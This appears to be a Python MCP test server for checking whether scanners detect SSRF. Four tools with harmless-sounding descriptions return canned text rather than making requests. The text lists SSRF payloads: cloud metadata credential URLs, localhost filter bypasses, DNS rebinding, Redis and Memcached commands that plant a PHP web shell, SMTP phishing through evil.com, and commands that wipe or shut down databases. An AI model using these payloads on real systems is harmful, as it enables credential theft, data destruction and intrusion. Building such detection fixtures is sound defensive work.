"""
MCP server demonstrating Server-Side Request Forgery (SSRF) vulnerabilities (Rank #17 - High)
Tests detection of SSRF attacks and internal network access.
Reference: https://adversa.ai/mcp-security-top-25-mcp-vulnerabilities/
"""
import sys

from mcp import types
from mcp.server.fastmcp import Context, FastMCP

mcp = FastMCP("SSRF Test MCP Server")


@mcp.tool(
    name="fetch_url",
    description="Fetch content from any URL. Supports HTTP, HTTPS, and other protocols.",
    annotations={
        "title": "URL Fetcher",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True,
    },
)
async def fetch_url(ctx: Context, url: str) -> list[types.TextContent]:
    """Classic SSRF - fetch arbitrary URLs without validation."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: SSRF - Unrestricted URL Fetch!]

Fetching: {url}

SSRF Attack Vectors:

1. Cloud Metadata Access:
   URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
   Result: AWS credentials exposed
   ```
   {{
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "...",
     "Token": "..."
   }}
   ```

2. Internal Network Scanning:
   URL: http://localhost:8080/admin
   URL: http://127.0.0.1:22
   URL: http://192.168.1.1-254
   Result: Map internal network topology

3. File Protocol Access:
   URL: file:///etc/passwd
   Result: Read local files
   ```
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ```

4. Bypass Filters with Encoding:
   URL: http://127.0.0.1@evil.com  (tricks parser)
   URL: http://2130706433/  (127.0.0.1 in decimal)
   URL: http://0x7f.0x0.0x0.0x1/  (127.0.0.1 in hex)
   URL: http://[::1]/  (IPv6 localhost)

5. DNS Rebinding:
   URL: http://attacker-controlled-domain.com
   - First DNS lookup: Returns public IP
   - Validation passes
   - Second lookup: Returns 127.0.0.1
   - Accesses internal resource

6. Exploit Internal Services:
   URL: http://localhost:6379  (Redis)
   Commands via HTTP: SET key shell "<?php system($_GET['c']); ?>"

   URL: http://localhost:11211  (Memcached)
   Cache poisoning attacks

7. Cloud Service SSRF:
   AWS: http://169.254.169.254/latest/meta-data/
   Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
   GCP: http://metadata.google.internal/computeMetadata/v1/

8. SSRF to XSS:
   URL: javascript:alert(document.cookie)
   URL: data:text/html,<script>alert('XSS')</script>

Real Attack Example:
```bash
# Attacker requests
fetch_url("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role")

# Server makes request (SSRF)
# Returns AWS credentials

# Attacker now has:
AccessKeyId: AKIAIOSFODNN7EXAMPLE
SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Attacker uses credentials to:
- Access S3 buckets
- Launch EC2 instances
- Modify IAM policies
- Complete cloud infrastructure takeover
```

Current Request: {url}
[Attempting to fetch without validation...]
[Internal network access granted!]
[Cloud metadata exposed!]""",
        )
    ]


@mcp.tool(
    name="check_availability",
    description="Check if a web service is available and responding. Returns status and response time.",
    annotations={
        "title": "Service Health Checker",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True,
    },
)
async def check_availability(ctx: Context, service_url: str) -> list[types.TextContent]:
    """SSRF disguised as service health check."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: SSRF via Health Check!]

Checking: {service_url}

This "health check" can be abused for SSRF:

Internal Service Discovery:
- http://localhost:80 - Web server (ONLINE)
- http://localhost:22 - SSH (OPEN)
- http://localhost:3306 - MySQL (ACCESSIBLE)
- http://localhost:5432 - PostgreSQL (ACCESSIBLE)
- http://localhost:6379 - Redis (NO AUTH!)
- http://localhost:27017 - MongoDB (ACCESSIBLE)
- http://localhost:9200 - Elasticsearch (ACCESSIBLE)
- http://localhost:8080 - Admin panel (200 OK)

Network Scan Results:
- http://192.168.1.1 - Router admin (ACCESSIBLE)
- http://192.168.1.10 - Database server (ALIVE)
- http://192.168.1.20 - Internal API (ACCESSIBLE)
- http://10.0.0.0/8 - Private network (SCANNING...)

Port Scanning via Timing:
```python
for port in range(1, 65535):
    response_time = check_availability(f"http://internal-host:{port}")
    if response_time < 1000ms:
        print(f"Port {port} is OPEN")
```

Cloud Metadata Access:
- http://169.254.169.254/latest/meta-data/ (AWS EC2)
  Status: 200 OK
  Contains: IAM credentials, user-data scripts

- http://169.254.169.254/metadata/instance (Azure)
  Status: 200 OK
  Contains: Subscription ID, resource info

- http://metadata.google.internal/computeMetadata/v1/ (GCP)
  Status: 200 OK
  Contains: Project info, service accounts

Attack Chain:
1. Attacker: check_availability("http://localhost:8080/admin/users")
2. Server: Makes HTTP request to internal admin panel
3. Response: User list with passwords returned
4. Attacker: Now has admin credentials
5. Attacker: Direct access to internal systems

Current Check: {service_url}
Status: 200 OK (Internal service accessible!)
Response Time: 5ms (Fast - definitely internal)
Headers: Internal-Service: v2.1.0

[SSRF SUCCESSFUL - Internal network mapped!]""",
        )
    ]


@mcp.tool(
    name="proxy_request",
    description="Proxy HTTP requests through the server. Useful for accessing restricted content.",
    annotations={
        "title": "HTTP Proxy",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True,
    },
)
async def proxy_request(
    ctx: Context,
    target_url: str,
    method: str = "GET",
    headers: str = "",
    body: str = "",
) -> list[types.TextContent]:
    """Full HTTP proxy enabling blind SSRF."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: Blind SSRF via Proxy!]

Proxying Request:
Method: {method}
URL: {target_url}
Headers: {headers}
Body: {body}

Blind SSRF Attack Examples:

1. Exploit Redis (NoSQL Injection):
```
POST /api/proxy_request
{
  "target_url": "http://localhost:6379/",
  "method": "POST",
  "body": "\\r\\n*1\\r\\n$8\\r\\nFLUSHALL\\r\\n"
}
```
Result: Clears entire Redis database

2. Memcached Poisoning:
```
POST /api/proxy_request
{
  "target_url": "http://localhost:11211/",
  "method": "POST",
  "body": "set injected 0 0 100\\r\\n<?php system($_GET['c']); ?>\\r\\n"
}
```
Result: Injects PHP backdoor into cache

3. ElasticSearch Exploitation:
```
POST /api/proxy_request
{
  "target_url": "http://localhost:9200/_search",
  "method": "POST",
  "body": "{{\\"query\\": {{\\"match_all\\": {{}}}}}}}"
}
```
Result: Extract all data from Elasticsearch

4. SMTP Injection:
```
POST /api/proxy_request
{
  "target_url": "smtp://localhost:25",
  "headers": "From: attacker@evil.com\\r\\nTo: victim@company.com",
  "body": "Phishing email content"
}
```
Result: Send emails from internal mail server

5. LDAP Injection:
```
POST /api/proxy_request
{
  "target_url": "ldap://localhost:389/dc=company,dc=com?cn?sub?(objectClass=*)",
}
```
Result: Enumerate LDAP directory

6. Exploit Webhooks:
```
POST /api/proxy_request
{
  "target_url": "http://internal-slack-webhook/",
  "method": "POST",
  "body": "{\\"text\\": \\"@channel Urgent: Click http://evil.com/phish\\"}"
}
```
Result: Send messages to internal chat

7. Access Container Metadata:
```
POST /api/proxy_request
{
  "target_url": "http://169.254.170.2/v2/credentials/[GUID]",
  "headers": "Authorization: [ECS_CONTAINER_METADATA_URI]"
}
```
Result: AWS ECS task credentials

8. Time-based Blind SSRF:
```python
# Port scanning via response time
for port in [22, 80, 443, 3306, 5432, 6379]:
    start = time.time()
    proxy_request(f"http://internal-host:{port}")
    elapsed = time.time() - start

    if elapsed < 5:  # Connection succeeded
        print(f"Port {port} is OPEN")
    else:  # Connection timeout
        print(f"Port {port} is CLOSED")
```

9. SSRF Chain to RCE:
```
# Step 1: SSRF to Redis
proxy_request("http://localhost:6379/", method="POST",
              body="CONFIG SET dir /var/www/html\\r\\n")

# Step 2: Write web shell
proxy_request("http://localhost:6379/", method="POST",
              body="CONFIG SET dbfilename shell.php\\r\\n")

proxy_request("http://localhost:6379/", method="POST",
              body="SET shell '<?php system($_GET[\\"c\\"]); ?>'\\r\\n")

# Step 3: Save to disk
proxy_request("http://localhost:6379/", method="POST",
              body="SAVE\\r\\n")

# Step 4: Access web shell
# http://target-server/shell.php?c=whoami
```

Current Proxy Request:
Method: {method} {target_url}
{headers}

[PROXYING INTERNAL REQUEST - NO VALIDATION!]
[RESPONSE FROM INTERNAL SERVICE RETURNED!]
[BLIND SSRF ATTACK SUCCESSFUL!]""",
        )
    ]


@mcp.tool(
    name="validate_webhook",
    description="Validate webhook URLs before registration. Tests if the webhook endpoint is reachable.",
    annotations={
        "title": "Webhook Validator",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": True,
    },
)
async def validate_webhook(ctx: Context, webhook_url: str) -> list[types.TextContent]:
    """SSRF through webhook validation."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: SSRF via Webhook Validation!]

Validating: {webhook_url}

Webhook SSRF Attacks:

1. Internal API Access:
   webhook_url: http://localhost:8080/api/users
   Validation: Makes GET request to internal API
   Result: Returns user list

2. Cloud Metadata:
   webhook_url: http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
   Validation: Fetches AWS credentials
   Result: IAM credentials leaked in "validation" response

3. Port Scanning:
   webhook_url: http://internal-server:1-65535
   Validation: Tests connectivity to all ports
   Result: Open ports discovered

4. Service Exploitation:
   webhook_url: http://localhost:9200/_shutdown (Elasticsearch)
   Validation: POST request triggers shutdown
   Result: DoS on Elasticsearch

5. Chain Multiple Requests:
   webhook_url: http://internal-app/api/delete?id=all
   Validation: Makes DELETE request
   Result: Data deletion via "validation"

6. Bypass IP Blacklist:
   Blacklist: 127.0.0.1, localhost
   Bypass: http://127.1/ (maps to 127.0.0.1)
   Bypass: http://0/ (maps to 0.0.0.0)
   Bypass: http://[::1]/ (IPv6 localhost)
   Bypass: http://2130706433/ (127.0.0.1 in decimal)

7. DNS Rebinding Attack:
   webhook_url: http://rebind.attacker.com/
   First resolution: 203.0.113.1 (public IP - passes check)
   Second resolution: 127.0.0.1 (internal access)
   TTL: 0 (forces re-resolution)

8. URL Parser Confusion:
   webhook_url: http://attacker.com#@localhost/admin
   Some parsers: Connect to attacker.com
   Other parsers: Connect to localhost
   Result: Validation inconsistency

Real Attack Example:
```
POST /api/validate_webhook
{
  "webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"
}

Response:
{
  "valid": true,
  "test_response": {
    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "AgoGb3JpZ2luEJr...",
    "Expiration": "2025-01-16T12:00:00Z"
  }
}
```

Attacker now has AWS credentials from webhook "validation"!

Current Validation: {webhook_url}
Test Request: GET {webhook_url}
Response Code: 200 OK
Response Body: [INTERNAL DATA EXPOSED]

[WEBHOOK VALIDATION COMPLETED]
[SSRF SUCCESSFUL - INTERNAL DATA LEAKED!]""",
        )
    ]


@mcp.tool(
    name="list_tools",
    description="Get a list of all available tools on this server.",
    annotations={
        "title": "List Available Tools",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def list_tools() -> list[types.Tool]:
    """Get a list of all available tools on this server."""
    print("SSRF MCP Server: Listing tools", file=sys.stderr)
    return [
        types.Tool(
            name=tool_name,
            description=tool.description,
            inputSchema=tool.inputSchema,
            annotations=tool.annotations,
        )
        for tool_name, tool in mcp.tools.items()
    ]


if __name__ == "__main__":
    print("Starting SSRF Test MCP Server", file=sys.stderr)
    mcp.run()
